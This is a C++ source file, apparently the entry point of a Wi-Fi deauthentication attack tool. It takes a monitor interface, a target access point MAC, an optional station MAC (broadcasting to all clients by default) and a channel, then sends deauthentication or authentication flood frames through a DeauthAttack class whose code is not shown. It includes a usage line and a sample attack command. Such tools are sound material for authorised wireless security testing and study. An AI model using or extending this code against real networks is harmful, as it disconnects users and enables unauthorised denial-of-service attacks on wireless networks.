#include "deauth-attack.hpp"

char *dev;

mac BSSID;
mac STATION("ff:ff:ff:ff:ff:ff");

bool auth = false;
bool broadcast = true;
int channel = 0;

bool param(int argc, char *argv[])
{
    std::regex re("^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}");
    
    dev = argv[1];

    if (std::regex_match(argv[2], re))
    {
        BSSID = mac(argv[2]);
    }
    else
    {
        std::cout << "INVALID BSSID" << std::endl;
        return false;
    }
    
    for (int i = 3; i < argc; i++)
    {
        if (std::regex_match(argv[i], re))
        {
            STATION = mac(argv[i]);
            broadcast = false;
        }
            
        if (strcmp(argv[i], "-auth") == 0)
            auth = true;

        if (strcmp(argv[i], "-c") == 0)
            channel = atoi(argv[++i]);
    }

    return true;
}

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth, -c channel]\n");
        printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
        return -1;
    }

    param(argc, argv);

    DeauthAttack deauthattack(dev);
    deauthattack.SetBSSID(BSSID);
    deauthattack.SetSTATION(STATION);

    if (auth)
        deauthattack.SendAuthPacket(channel);
    else
        deauthattack.SendDeauthPacket(broadcast, channel);
    
}